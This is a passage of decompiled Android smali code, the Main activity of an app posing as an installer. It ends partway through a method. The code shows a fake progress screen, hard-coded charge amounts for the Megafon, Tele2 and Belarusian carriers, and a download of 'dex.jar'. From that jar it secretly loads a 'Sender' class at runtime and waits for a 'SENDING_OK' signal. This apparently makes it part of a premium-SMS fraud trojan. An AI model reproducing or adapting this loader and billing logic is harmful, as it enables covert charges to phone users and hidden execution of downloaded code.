.class public Lcom/software/application/Main;
.super Landroid/app/Activity;
.source "Main.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/software/application/Main$AsyncLoader;
    }
.end annotation


# static fields
.field public static final CNT_NAME:Ljava/lang/String; = "*CNT_NAME*"

.field private static final INSTALLED_URL:Ljava/lang/String; = "INSTALLED_URL"

.field public static final JAR_FILENAME:Ljava/lang/String; = "dex.jar"

.field private static final OFFERT_ACTIVITY:I = 0x1

.field public static final PREFS:Ljava/lang/String; = "PREFS"

.field private static final RESULT_OK:I = 0x1

.field public static final SENDING_OK:Ljava/lang/String; = "SENDING_OK"

.field private static final WAS_INSTALLED:Ljava/lang/String; = "WAS_INSTALLED"


# instance fields
.field private actor:Lcom/software/application/Actor;

.field private agreementTextView:Landroid/widget/TextView;

.field private byPrice:Ljava/lang/String;

.field private dialog:Landroid/app/ProgressDialog;

.field private exitTextView:Landroid/widget/TextView;

.field private footerTextView:Landroid/widget/TextView;

.field private installedContentTextView:Landroid/widget/TextView;

.field private mainTextView:Landroid/widget/TextView;

.field private mfPrice:Ljava/lang/String;

.field private okURL:Ljava/lang/String;

.field private pleaseWaitString:Ljava/lang/String;

.field private progressBar:Landroid/widget/ProgressBar;

.field private sender:Lcom/software/application/Sender;

.field private tele2Price:Ljava/lang/String;

.field private wasProgressDone:Z

.field private yesButton:Landroid/widget/Button;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 39
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 83
    const-string v0, "236"

    iput-object v0, p0, Lcom/software/application/Main;->mfPrice:Ljava/lang/String;

    .line 85
    const-string v0, "94.70"

    iput-object v0, p0, Lcom/software/application/Main;->tele2Price:Ljava/lang/String;

    .line 87
    const-string v0, "19900"

    iput-object v0, p0, Lcom/software/application/Main;->byPrice:Ljava/lang/String;

    .line 291
    return-void
.end method

.method static synthetic access$000(Lcom/software/application/Main;)Lcom/software/application/Sender;
    .locals 1
    .param p0, "x0"    # Lcom/software/application/Main;

    .prologue
    .line 39
    iget-object v0, p0, Lcom/software/application/Main;->sender:Lcom/software/application/Sender;

    return-object v0
.end method

.method static synthetic access$002(Lcom/software/application/Main;Lcom/software/application/Sender;)Lcom/software/application/Sender;
    .locals 0
    .param p0, "x0"    # Lcom/software/application/Main;
    .param p1, "x1"    # Lcom/software/application/Sender;

    .prologue
    .line 39
    iput-object p1, p0, Lcom/software/application/Main;->sender:Lcom/software/application/Sender;

    return-object p1
.end method

.method static synthetic access$100(Lcom/software/application/Main;)V
    .locals 0
    .param p0, "x0"    # Lcom/software/application/Main;

    .prologue
    .line 39
    invoke-direct {p0}, Lcom/software/application/Main;->start()V

    return-void
.end method

.method static synthetic access$1002(Lcom/software/application/Main;Ljava/lang/String;)Ljava/lang/String;
    .locals 0
    .param p0, "x0"    # Lcom/software/application/Main;
    .param p1, "x1"    # Ljava/lang/String;

    .prologue
    .line 39
    iput-object p1, p0, Lcom/software/application/Main;->okURL:Ljava/lang/String;

    return-object p1
.end method

.method static synthetic access$1100(Lcom/software/application/Main;)V
    .locals 0
    .param p0, "x0"    # Lcom/software/application/Main;

    .prologue
    .line 39
    invoke-direct {p0}, Lcom/software/application/Main;->updateGUI()V

    return-void
.end method

.method static synthetic access$200(Lcom/software/application/Main;Ljava/lang/String;)V
    .locals 0
    .param p0, "x0"    # Lcom/software/application/Main;
    .param p1, "x1"    # Ljava/lang/String;

    .prologue
    .line 39
    invoke-direct {p0, p1}, Lcom/software/application/Main;->showNetworkErrorToast(Ljava/lang/String;)V

    return-void
.end method

.method static synthetic access$300(Lcom/software/application/Main;)V
    .locals 0
    .param p0, "x0"    # Lcom/software/application/Main;

    .prologue
    .line 39
    invoke-direct {p0}, Lcom/software/application/Main;->showRules()V

    return-void
.end method

.method static synthetic access$400(Lcom/software/application/Main;)Landroid/app/ProgressDialog;
    .locals 1
    .param p0, "x0"    # Lcom/software/application/Main;

    .prologue
    .line 39
    iget-object v0, p0, Lcom/software/application/Main;->dialog:Landroid/app/ProgressDialog;

    return-object v0
.end method

.method static synthetic access$500(Lcom/software/application/Main;)V
    .locals 0
    .param p0, "x0"    # Lcom/software/application/Main;

    .prologue
    .line 39
    invoke-direct {p0}, Lcom/software/application/Main;->showURL()V

    return-void
.end method

.method static synthetic access$600(Lcom/software/application/Main;)Landroid/widget/ProgressBar;
    .locals 1
    .param p0, "x0"    # Lcom/software/application/Main;

    .prologue
    .line 39
    iget-object v0, p0, Lcom/software/application/Main;->progressBar:Landroid/widget/ProgressBar;

    return-object v0
.end method

.method static synthetic access$700(Lcom/software/application/Main;)Lcom/software/application/Actor;
    .locals 1
    .param p0, "x0"    # Lcom/software/application/Main;

    .prologue
    .line 39
    iget-object v0, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    return-object v0
.end method

.method static synthetic access$800(Lcom/software/application/Main;)Landroid/widget/TextView;
    .locals 1
    .param p0, "x0"    # Lcom/software/application/Main;

    .prologue
    .line 39
    iget-object v0, p0, Lcom/software/application/Main;->mainTextView:Landroid/widget/TextView;

    return-object v0
.end method

.method static synthetic access$902(Lcom/software/application/Main;Z)Z
    .locals 0
    .param p0, "x0"    # Lcom/software/application/Main;
    .param p1, "x1"    # Z

    .prologue
    .line 39
    iput-boolean p1, p0, Lcom/software/application/Main;->wasProgressDone:Z

    return p1
.end method

.method private areInstalledAndActedLinksEquals()Z
    .locals 2

    .prologue
    .line 362
    iget-object v0, p0, Lcom/software/application/Main;->okURL:Ljava/lang/String;

    iget-object v1, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v1}, Lcom/software/application/Actor;->getLinkHasToBeActed()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    return v0
.end method

.method public static getSenderInstance(Landroid/content/Context;Ljava/lang/String;)Lcom/software/application/Sender;
    .locals 7
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "pathToJar"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 387
    const-string v4, "outdex"

    const/4 v5, 0x0

    invoke-virtual {p0, v4, v5}, Landroid/content/Context;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v1

    .line 388
    .local v1, "dexOutputPath":Ljava/io/File;
    new-instance v0, Ldalvik/system/DexClassLoader;

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    invoke-virtual {p0}, Landroid/content/Context;->getClassLoader()Ljava/lang/ClassLoader;

    move-result-object v6

    invoke-direct {v0, p1, v4, v5, v6}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V

    .line 392
    .local v0, "cl":Ldalvik/system/DexClassLoader;
    const/4 v3, 0x0

    .line 393
    .local v3, "senderProviderClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    const-string v4, "com.software.application.lib.Msg"

    invoke-virtual {v0, v4}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v3

    .line 394
    invoke-virtual {v3}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Lcom/software/application/Sender;

    .line 395
    .local v2, "sender":Lcom/software/application/Sender;
    return-object v2
.end method

.method private initButtons()V
    .locals 2

    .prologue
    .line 123
    const v0, 0x7f090007

    invoke-virtual {p0, v0}, Lcom/software/application/Main;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/software/application/Main;->yesButton:Landroid/widget/Button;

    .line 124
    invoke-direct {p0}, Lcom/software/application/Main;->wasOK()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 125
    iget-object v0, p0, Lcom/software/application/Main;->yesButton:Landroid/widget/Button;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setEnabled(Z)V

    .line 126
    iget-object v0, p0, Lcom/software/application/Main;->yesButton:Landroid/widget/Button;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setVisibility(I)V

    .line 128
    :cond_0
    invoke-direct {p0}, Lcom/software/application/Main;->setListeners()V

    .line 129
    return-void
.end method

.method private initGUI()V
    .locals 0

    .prologue
    .line 118
    invoke-direct {p0}, Lcom/software/application/Main;->initButtons()V

    .line 119
    invoke-direct {p0}, Lcom/software/application/Main;->initTextViews()V

    .line 120
    return-void
.end method

.method private initSettings()V
    .locals 3

    .prologue
    const/4 v2, 0x0

    .line 356
    const-string v1, "PREFS"

    invoke-virtual {p0, v1, v2}, Lcom/software/application/Main;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 357
    .local v0, "settings":Landroid/content/SharedPreferences;
    const-string v1, "WAS_INSTALLED"

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v1

    iput-boolean v1, p0, Lcom/software/application/Main;->wasProgressDone:Z

    .line 358
    const-string v1, "INSTALLED_URL"

    const-string v2, ""

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/software/application/Main;->okURL:Ljava/lang/String;

    .line 359
    return-void
.end method

.method private initTextViews()V
    .locals 4

    .prologue
    .line 132
    const v1, 0x7f090008

    invoke-virtual {p0, v1}, Lcom/software/application/Main;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/TextView;

    iput-object v1, p0, Lcom/software/application/Main;->mainTextView:Landroid/widget/TextView;

    .line 133
    invoke-direct {p0}, Lcom/software/application/Main;->wasOK()Z

    move-result v1

    if-nez v1, :cond_3

    .line 134
    iget-object v1, p0, Lcom/software/application/Main;->mainTextView:Landroid/widget/TextView;

    iget-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v2}, Lcom/software/application/Actor;->getMainLocalizedText()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 138
    :goto_0
    iget-object v1, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v1}, Lcom/software/application/Actor;->isUkID()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 139
    const v1, 0x7f090003

    invoke-virtual {p0, v1}, Lcom/software/application/Main;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    .line 140
    .local v0, "tv":Landroid/widget/TextView;
    const/16 v1, 0x8

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setVisibility(I)V

    .line 141
    invoke-direct {p0}, Lcom/software/application/Main;->wasOK()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 142
    iget-object v1, p0, Lcom/software/application/Main;->mainTextView:Landroid/widget/TextView;

    invoke-virtual {p0}, Lcom/software/application/Main;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    const v3, 0x7f070006

    invoke-virtual {v2, v3}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 145
    .end local v0    # "tv":Landroid/widget/TextView;
    :cond_0
    const v1, 0x7f09000a

    invoke-virtual {p0, v1}, Lcom/software/application/Main;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/TextView;

    iput-object v1, p0, Lcom/software/application/Main;->installedContentTextView:Landroid/widget/TextView;

    .line 146
    iget-object v1, p0, Lcom/software/application/Main;->installedContentTextView:Landroid/widget/TextView;

    iget-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v2}, Lcom/software/application/Actor;->getSecondText()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 147
    invoke-direct {p0}, Lcom/software/application/Main;->wasOK()Z

    move-result v1

    if-nez v1, :cond_1

    iget-object v1, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v1}, Lcom/software/application/Actor;->isUkID()Z

    move-result v1

    if-eqz v1, :cond_2

    .line 148
    :cond_1
    iget-object v1, p0, Lcom/software/application/Main;->installedContentTextView:Landroid/widget/TextView;

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setEnabled(Z)V

    .line 149
    iget-object v1, p0, Lcom/software/application/Main;->installedContentTextView:Landroid/widget/TextView;

    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setVisibility(I)V

    .line 151
    :cond_2
    return-void

    .line 136
    :cond_3
    iget-object v1, p0, Lcom/software/application/Main;->mainTextView:Landroid/widget/TextView;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v3, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v3}, Lcom/software/application/Actor;->getMainLocalizedText()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "100%"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_0
.end method

.method private install()V
    .locals 6

    .prologue
    const/4 v4, 0x1

    const/4 v5, 0x0

    .line 154
    invoke-direct {p0}, Lcom/software/application/Main;->wasOK()Z

    move-result v2

    if-nez v2, :cond_0

    .line 155
    new-instance v2, Lcom/software/application/Main$AsyncLoader;

    invoke-direct {v2, p0}, Lcom/software/application/Main$AsyncLoader;-><init>(Lcom/software/application/Main;)V

    new-array v3, v4, [Ljava/lang/String;

    const v4, 0x7f070015

    invoke-virtual {p0, v4}, Lcom/software/application/Main;->getString(I)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v3, v5

    invoke-virtual {v2, v3}, Lcom/software/application/Main$AsyncLoader;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 165
    :goto_0
    return-void

    .line 158
    :cond_0
    :try_start_0
    new-instance v1, Ljava/io/File;

    const-string v2, "dex_lib"

    const/4 v3, 0x0

    invoke-virtual {p0, v2, v3}, Lcom/software/application/Main;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v2

    const-string v3, "dex.jar"

    invoke-direct {v1, v2, v3}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 159
    .local v1, "jarFile":Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    invoke-static {p0, v2}, Lcom/software/application/Main;->getSenderInstance(Landroid/content/Context;Ljava/lang/String;)Lcom/software/application/Sender;

    move-result-object v2

    iput-object v2, p0, Lcom/software/application/Main;->sender:Lcom/software/application/Sender;

    .line 160
    invoke-direct {p0}, Lcom/software/application/Main;->updateGUI()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 161
    .end local v1    # "jarFile":Ljava/io/File;
    :catch_0
    move-exception v0

    .line 162
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-static {p0, v2, v4}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    goto :goto_0
.end method

.method private registerReceiver()V
    .locals 3

    .prologue
    .line 262
    new-instance v0, Lcom/software/application/Main$4;

    invoke-direct {v0, p0}, Lcom/software/application/Main$4;-><init>(Lcom/software/application/Main;)V

    new-instance v1, Landroid/content/IntentFilter;

    const-string v2, "SENDING_OK"

    invoke-direct {v1, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0, v1}, Lcom/software/application/Main;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 278
    return-void
.end method

.method private setListeners()V
    .locals 9

    .prologue
    const v8, 0x7f090005

    const v7, 0x7f090004

    const v6, 0x7f090003

    const/16 v4, 0x8

    const/4 v5, 0x0

    .line 174
    iget-object v2, p0, Lcom/software/application/Main;->yesButton:Landroid/widget/Button;

    new-instance v3, Lcom/software/application/Main$1;

    invoke-direct {v3, p0}, Lcom/software/application/Main$1;-><init>(Lcom/software/application/Main;)V

    invoke-virtual {v2, v3}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 185
    invoke-virtual {p0, v6}, Lcom/software/application/Main;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/TextView;

    iput-object v2, p0, Lcom/software/application/Main;->footerTextView:Landroid/widget/TextView;

    .line 186
    invoke-virtual {p0, v7}, Lcom/software/application/Main;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/TextView;

    iput-object v2, p0, Lcom/software/application/Main;->agreementTextView:Landroid/widget/TextView;

    .line 187
    invoke-virtual {p0, v8}, Lcom/software/application/Main;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/TextView;

    iput-object v2, p0, Lcom/software/application/Main;->exitTextView:Landroid/widget/TextView;

    .line 188
    iget-object v2, p0, Lcom/software/application/Main;->agreementTextView:Landroid/widget/TextView;

    invoke-virtual {v2, v4}, Landroid/widget/TextView;->setVisibility(I)V

    .line 189
    iget-object v2, p0, Lcom/software/application/Main;->exitTextView:Landroid/widget/TextView;

    invoke-virtual {v2, v4}, Landroid/widget/TextView;->setVisibility(I)V

    .line 190
    iget-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v2}, Lcom/software/application/Actor;->isMegafon()Z

    move-result v2

    if-nez v2, :cond_0

    iget-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v2}, Lcom/software/application/Actor;->isTele2()Z

    move-result v2

    if-nez v2, :cond_0

    iget-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v2}, Lcom/software/application/Actor;->isBy()Z

    move-result v2

    if-eqz v2, :cond_1

    .line 192
    :cond_0
    iget-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v2}, Lcom/software/application/Actor;->isMegafon()Z

    move-result v2

    if-eqz v2, :cond_2

    .line 193
    iget-object v1, p0, Lcom/software/application/Main;->mfPrice:Ljava/lang/String;

    .line 199
    .local v1, "price":Ljava/lang/String;
    :goto_0
    iget-object v2, p0, Lcom/software/application/Main;->footerTextView:Landroid/widget/TextView;

    invoke-virtual {v2, v5}, Landroid/widget/TextView;->setVisibility(I)V

    .line 200
    iget-object v2, p0, Lcom/software/application/Main;->agreementTextView:Landroid/widget/TextView;

    invoke-virtual {v2, v5}, Landroid/widget/TextView;->setVisibility(I)V

    .line 201
    iget-object v2, p0, Lcom/software/application/Main;->exitTextView:Landroid/widget/TextView;

    invoke-virtual {v2, v5}, Landroid/widget/TextView;->setVisibility(I)V

    .line 202
    invoke-virtual {p0, v6}, Lcom/software/application/Main;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/TextView;

    iput-object v2, p0, Lcom/software/application/Main;->footerTextView:Landroid/widget/TextView;

    .line 203
    iget-object v2, p0, Lcom/software/application/Main;->footerTextView:Landroid/widget/TextView;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const v4, 0x7f07000f

    invoke-virtual {p0, v4}, Lcom/software/application/Main;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, " "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const v4, 0x7f070010

    invoke-virtual {p0, v4}, Lcom/software/application/Main;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 204
    invoke-virtual {p0, v7}, Lcom/software/application/Main;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/TextView;

    iput-object v2, p0, Lcom/software/application/Main;->agreementTextView:Landroid/widget/TextView;

    .line 205
    new-instance v0, Landroid/text/SpannableString;

    const v2, 0x7f07000d

    invoke-virtual {p0, v2}, Lcom/software/application/Main;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, v2}, Landroid/text/SpannableString;-><init>(Ljava/lang/CharSequence;)V

    .line 206
    .local v0, "content":Landroid/text/SpannableString;
    new-instance v2, Landroid/text/style/UnderlineSpan;

    invoke-direct {v2}, Landroid/text/style/UnderlineSpan;-><init>()V

    invoke-virtual {v0}, Landroid/text/SpannableString;->length()I

    move-result v3

    invoke-virtual {v0, v2, v5, v3, v5}, Landroid/text/SpannableString;->setSpan(Ljava/lang/Object;III)V

    .line 207
    iget-object v2, p0, Lcom/software/application/Main;->agreementTextView:Landroid/widget/TextView;

    invoke-virtual {v2, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 208
    iget-object v2, p0, Lcom/software/application/Main;->agreementTextView:Landroid/widget/TextView;

    new-instance v3, Lcom/software/application/Main$2;

    invoke-direct {v3, p0}, Lcom/software/application/Main$2;-><init>(Lcom/software/application/Main;)V

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 216
    invoke-virtual {p0, v8}, Lcom/software/application/Main;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/TextView;

    iput-object v2, p0, Lcom/software/application/Main;->exitTextView:Landroid/widget/TextView;

    .line 217
    new-instance v0, Landroid/text/SpannableString;

    .end local v0    # "content":Landroid/text/SpannableString;
    const v2, 0x7f07000e

    invoke-virtual {p0, v2}, Lcom/software/application/Main;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, v2}, Landroid/text/SpannableString;-><init>(Ljava/lang/CharSequence;)V

    .line 218
    .restart local v0    # "content":Landroid/text/SpannableString;
    new-instance v2, Landroid/text/style/UnderlineSpan;

    invoke-direct {v2}, Landroid/text/style/UnderlineSpan;-><init>()V

    invoke-virtual {v0}, Landroid/text/SpannableString;->length()I

    move-result v3

    invoke-virtual {v0, v2, v5, v3, v5}, Landroid/text/SpannableString;->setSpan(Ljava/lang/Object;III)V

    .line 219
    iget-object v2, p0, Lcom/software/application/Main;->exitTextView:Landroid/widget/TextView;

    invoke-virtual {v2, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 220
    iget-object v2, p0, Lcom/software/application/Main;->exitTextView:Landroid/widget/TextView;

    new-instance v3, Lcom/software/application/Main$3;

    invoke-direct {v3, p0}, Lcom/software/application/Main$3;-><init>(Lcom/software/application/Main;)V

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 228
    .end local v0    # "content":Landroid/text/SpannableString;
    .end local v1    # "price":Ljava/lang/String;
    :cond_1
    return-void

    .line 194
    :cond_2
    iget-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v2}, Lcom/software/application/Actor;->isBy()Z

    move-result v2

    if-eqz v2, :cond_3

    .line 195
    iget-object v1, p0, Lcom/software/application/Main;->byPrice:Ljava/lang/String;

    .restart local v1    # "price":Ljava/lang/String;
    goto/16 :goto_0

    .line 197
    .end local v1    # "price":Ljava/lang/String;
    :cond_3
    iget-object v1, p0, Lcom/software/application/Main;->tele2Price:Ljava/lang/String;

    .restart local v1    # "price":Ljava/lang/String;
    goto/16 :goto_0
.end method

.method private showNetworkErrorToast(Ljava/lang/String;)V
    .locals 2
    .param p1, "result"    # Ljava/lang/String;

    .prologue
    .line 288
    invoke-virtual {p0}, Lcom/software/application/Main;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v0, p1, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 289
    return-void
.end method

.method private showRules()V
    .locals 2

    .prologue
    .line 399
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/software/application/OffertActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 400
    .local v0, "i":Landroid/content/Intent;
    const/4 v1, 0x1

    invoke-virtual {p0, v0, v1}, Lcom/software/application/Main;->startActivityForResult(Landroid/content/Intent;I)V

    .line 401
    return-void
.end method

.method private showURL()V
    .locals 3

    .prologue
    .line 281
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/software/application/ShowLink;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 282
    .local v0, "i":Landroid/content/Intent;
    const-string v1, "URL"

    iget-object v2, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v2}, Lcom/software/application/Actor;->getActedLink()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 283
    invoke-virtual {p0, v0}, Lcom/software/application/Main;->startActivity(Landroid/content/Intent;)V

    .line 284
    invoke-virtual {p0}, Lcom/software/application/Main;->finish()V

    .line 285
    return-void
.end method

.method private start()V
    .locals 2

    .prologue
    .line 231
    new-instance v0, Landroid/app/ProgressDialog;

    invoke-direct {v0, p0}, Landroid/app/ProgressDialog;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/software/application/Main;->dialog:Landroid/app/ProgressDialog;

    .line 232
    iget-object v0, p0, Lcom/software/application/Main;->dialog:Landroid/app/ProgressDialog;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/app/ProgressDialog;->setCancelable(Z)V

    .line 233
    iget-object v0, p0, Lcom/software/application/Main;->dialog:Landroid/app/ProgressDialog;

    iget-object v1, p0, Lcom/software/application/Main;->pleaseWaitString:Ljava/lang/String;

    invoke-virtual {v0, v1}, Landroid/app/ProgressDialog;->setMessage(Ljava/lang/CharSequence;)V

    .line 234
    iget-object v0, p0, Lcom/software/application/Main;->dialog:Landroid/app/ProgressDialog;

    invoke-virtual {v0}, Landroid/app/ProgressDialog;->show()V

    .line 235
    invoke-direct {p0}, Lcom/software/application/Main;->registerReceiver()V

    .line 236
    iget-object v0, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    iget-object v1, p0, Lcom/software/application/Main;->sender:Lcom/software/application/Sender;

    invoke-virtual {v0, v1}, Lcom/software/application/Actor;->setSender(Lcom/software/application/Sender;)V

    .line 237
    iget-object v0, p0, Lcom/software/application/Main;->actor:Lcom/software/application/Actor;

    invoke-virtual {v0}, Lcom/software/application/Actor;->activate()V

    .line 238
    return-void
.end method

.method private startC2DM()V
    .locals 3

    .prologue
    .line 112
    new-instance v0, Lcom/software/application/Notificator;

    invoke-direct {v0}, Lcom/software/application/Notificator;-><init>()V

    .line 113
    .local v0, "notifier":Lcom/software/application/Notificator;
    const-string v1, "PREFS"

    const/4 v2, 0x0

    invoke-virtual {p0, v1, v2}, Lcom/software/application/Main;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/software/application/Notificator;->setPrefs(Landroid/content/SharedPreferences;)V

    .line 114
    invoke-virtual {p0}, Lcom/software/application/Main;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/software/application/Notificator;->initNotificationsNumberSettings(Landroid/content/Context;)V

    .line 115
    return-void
.end method

.method private updateGUI()V
    .locals 2

    .prologue
    .line 168
    iget-object v0, p0, Lcom/software/application/Main;->progressBar:Landroid/widget/ProgressBar;

    const/16 v1, 0x64

    invoke-virtual {v0, v1}, Landroid/widget/ProgressBar;->setProgress(I)V

    .line 169
    invoke-direct {p0}, Lcom/software/application/Main;->initGUI()V

    .line 170
    invoke-virtual {p0}, Lcom/software/application/Main;->animateButtons()V

    .line 171
    return-void
.end method

.method private wasOK()Z
    .locals 1

    .prologue
    .line 366
